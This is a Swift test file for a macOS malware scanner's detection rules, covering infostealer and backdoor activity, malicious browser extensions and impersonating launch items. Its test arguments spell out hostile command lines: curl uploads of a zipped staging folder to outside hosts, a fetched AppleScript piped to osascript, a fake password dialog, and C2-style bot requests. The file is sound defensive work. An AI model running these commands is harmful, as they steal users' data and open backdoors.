import Foundation
import Testing
@testable import BluehatCore

struct StarterRuleTests {
    let rulebook: Rulebook

    init() throws {
        let url = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
            .appending(components: "rules", "rules.json")
        rulebook = try Rulebook.decode(from: Data(contentsOf: url))
    }

    func matches(_ ruleID: String, _ text: String) throws -> Bool {
        let rule = try #require(rulebook.rules.first { $0.id == ruleID })
        return Scanner.matches(Scanner.regexes(rule.patterns), text)
    }

    @Test(arguments: [
        "curl --connect-timeout 120 --max-time 300 -X POST -F \"file=@/tmp/out.zip\" https://sivvino.example/contact",
        "ditto -c -k --sequesterRsrc /tmp/9556/ /tmp/out.zip",
        "osascript -e display dialog \"Application wants to install helper\" default answer \"\" with hidden answer",
        "curl -fsSL https://x.example/a.scpt | osascript",
        "curl -X POST -H uuid: 162302ce3e3c4678 -H user: maxbloomberg -H buildid: agov --data-binary @/tmp/out.zip http://79.137.192.4/p2p",
        "zip -r /tmp/shub_log.zip /tmp/shub_8f2a",
    ])
    func detectsStealerActivity(command: String) throws {
        #expect(try matches("process.stealer-activity", command))
    }

    @Test(arguments: [
        "curl -F file=@/Users/me/report.pdf https://upload.example",
        "ditto -c -k --sequesterRsrc --keepParent MyApp.app MyApp.zip",
        "osascript -e display dialog \"Done\"",
        "curl --data-binary @/tmp/payload.json http://localhost:8080/api",
    ])
    func ignoresNormalCommands(command: String) throws {
        #expect(try !matches("process.stealer-activity", command))
    }

    @Test func detectsAmosBackdoorLoop() throws {
        #expect(try matches("process.stealer-backdoor", "/bin/bash /Users/alex/.agent"))
        #expect(try !matches("process.stealer-backdoor", "/Users/alex/.agentrc-loader"))
    }

    @Test(arguments: [
        "/bin/bash /Users/alex/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate",
        "/bin/zsh /tmp/.c.sh",
        "curl -s http://45.146.130.131/api/v1/bot/repeat/alex",
        "curl -s http://45.146.130.131/v1/bot/joinsystem/",
        "/tmp/socks",
    ])
    func detectsShubAndOdysseyBackdoors(command: String) throws {
        #expect(try matches("process.stealer-backdoor", command))
    }

    @Test(arguments: [
        "/Users/alex/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater --wake",
        "/tmp/socks5-proxy --port 1080",
        "ssh -D 1080 -S /tmp/socks host.example",
        "curl https://api.example.com/v1/bots/actions",
    ])
    func ignoresGoogleUpdaterAndProxies(command: String) throws {
        #expect(try !matches("process.stealer-backdoor", command))
    }

    @Test func detectsShubLaunchItemButNotGoogleUpdaters() throws {
        #expect(try matches("launch.shub-fake-google-updater", "/Users/alex/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate"))
        #expect(try !matches("launch.shub-fake-google-updater", "/Users/alex/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent -runMode ifneeded"))
        #expect(try !matches("launch.shub-fake-google-updater", "/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater --wake-all --system"))
        #expect(try !matches("launch.shub-fake-google-updater", "/Users/alex/Library/LaunchAgents/com.google.keystone.agent.plist"))
    }

    @Test(arguments: [
        ("extension.cyberhaven-campaign-2024-12", "nnpnnpemnckcfdebeekibpiijlicmpom"),
        ("extension.cyberhaven-campaign-2024-12-fixed", "pajkjnmeojmbapicmbpliphjmcekeaac"),
        ("extension.csp-stripping-2025-02", "gdocgbfmddcfnlnpmnghmjicjognhonm"),
        ("extension.reddirection-2025-07", "eokjikchkppnkdipbiggnmlkahcdkikp"),
        ("extension.shadypanda-2025-12", "mljmfnkjmcdmongjnnnbbnajjdbojoci"),
    ])
    func flagsKnownBadExtensionsByIDOnly(ruleID: String, extensionID: String) throws {
        let rule = try #require(rulebook.rules.first { $0.id == ruleID })
        #expect((rule.patterns ?? []).allSatisfy { $0.range(of: #"^\^browser=\\S\{1,32\} id=[a-p]{32}\\s$"#, options: .regularExpression) != nil })
        #expect(try matches(ruleID, "browser=Chrome id=\(extensionID) name=Helper update=https://clients2.google.com/service/update2/crx permissions=storage"))
        #expect(try matches(ruleID, "browser=Edge id=\(extensionID) name=Helper update=none permissions="))
        #expect(try !matches(ruleID, "browser=Chrome id=abcdefghijklmnopabcdefghijklmnop name=\(extensionID) update=none permissions="))
        #expect(try !matches(ruleID, "browser=Chrome id=a\(extensionID) name=Helper update=none permissions="))
    }

    @Test func flagsOnlyExtensionsOutsideOfficialStores() throws {
        let store = "browser=Chrome id=a name=Grammar update=https://clients2.google.com/service/update2/crx permissions=storage"
        let edge = "browser=Edge id=b name=Notes update=https://edge.microsoft.com/extensionwebstorebase/v1/crx permissions="
        let mozilla = "browser=Firefox id=c name=Blocker update=addons.mozilla.org permissions=storage"
        #expect(try !matches("extension.sideloaded", store))
        #expect(try !matches("extension.sideloaded", edge))
        #expect(try !matches("extension.sideloaded", mozilla))
        #expect(try matches("extension.sideloaded", "browser=Chrome id=d name=PDF update=https://evil.example/u.xml permissions="))
        #expect(try matches("extension.sideloaded", "browser=Chrome id=e name=PDF update=none permissions="))
        #expect(try matches("extension.sideloaded", "browser=Chrome id=f name=x update=https://clients2.google.com/service/update2/crx update=https://evil.example/u.xml permissions="))
    }

    @Test func flagsCookieAccessOnAllSitesOnly() throws {
        #expect(try matches("extension.cookie-access", "browser=Chrome id=a name=x update=none permissions=cookies,<all_urls>"))
        #expect(try matches("extension.cookie-access", "browser=Chrome id=a name=x update=none permissions=*://*/*,storage,cookies"))
        #expect(try !matches("extension.cookie-access", "browser=Chrome id=a name=x update=none permissions=cookies,https://mail.example/*"))
        #expect(try !matches("extension.cookie-access", "browser=Chrome id=a name=x update=none permissions=<all_urls>,storage"))
    }

    @Test func flagsDebuggerAndProxyPermissions() throws {
        #expect(try matches("extension.debugger-proxy", "browser=Chrome id=a name=x update=none permissions=storage,debugger"))
        #expect(try matches("extension.debugger-proxy", "browser=Firefox id=a name=x update=none permissions=proxy,<all_urls>"))
        #expect(try !matches("extension.debugger-proxy", "browser=Chrome id=a name=x update=none permissions=storage,tabs"))
    }

    @Test func flagsSystemExtensionsOnlyFromUnlistedVendors() throws {
        let rule = try #require(rulebook.rules.first { $0.id == "sysext.unknown-vendor" })
        let extensions = [
            (bundle: "io.tailscale.ipn.macsys.network-extension", team: Optional("W5364U7YZB"), detail: "Tailscale"),
            (bundle: "io.macfuse.filesystems.macfuse", team: String?.none, detail: "macFUSE"),
            (bundle: "com.example.filter", team: Optional("AB12CD34EF"), detail: "Unknown filter"),
            (bundle: "com.example.rootkit", team: String?.none, detail: "Unknown kext"),
        ]
        #expect(Scanner.systemExtensionFindings([rule], extensions: extensions).map(\.detail) == ["Unknown filter", "Unknown kext"])
    }

    @Test func flagsOnlyXProtectBelowTheMinimum() throws {
        let rule = try #require(rulebook.rules.first { $0.id == "xprotect.outdated" })
        let minimum = try #require(rule.minimumVersion)
        #expect(Scanner.xprotectFindings([rule], version: minimum - 1).count == 1)
        #expect(Scanner.xprotectFindings([rule], version: minimum).isEmpty)
    }

    @Test func flagsOnlyAppsGatekeeperCallsUnnotarized() throws {
        let rule = try #require(rulebook.rules.first { $0.id == "app.unnotarized" })
        #expect(rule.check == .notarization)
        #expect(rule.severity == .low)
        var cache = NotarizationCache(fileURL: FileManager.default.temporaryDirectory.appending(path: "bluehat-notarization-\(UUID().uuidString).json"))
        let apps = [
            (path: "/Applications/Stats.app", team: "RP2S87B72W", cdhash: "373e7d3b", isNotarized: true),
            (path: "/Applications/Old.app", team: "AB12CD34EF", cdhash: "9a6e0b67", isNotarized: false),
        ]
        let result = Scanner.notarizationFindings([rule], apps: apps, cache: &cache) { _ in false }
        #expect(result.findings.map(\.detail) == ["Old.app · team AB12CD34EF · /Applications/Old.app"])
    }

    @Test func detectsAppleNamedLaunchItemsOutsideSystem() throws {
        #expect(try matches("launch.apple-impersonation", "/Users/alex/Library/LaunchAgents/com.apple.crashreporter.helper.plist"))
        #expect(try matches("launch.apple-impersonation", "/Library/LaunchDaemons/com.apple.systemupdater.plist"))
        #expect(try !matches("launch.apple-impersonation", "/Library/LaunchDaemons/com.google.keystone.daemon.plist"))
    }
}
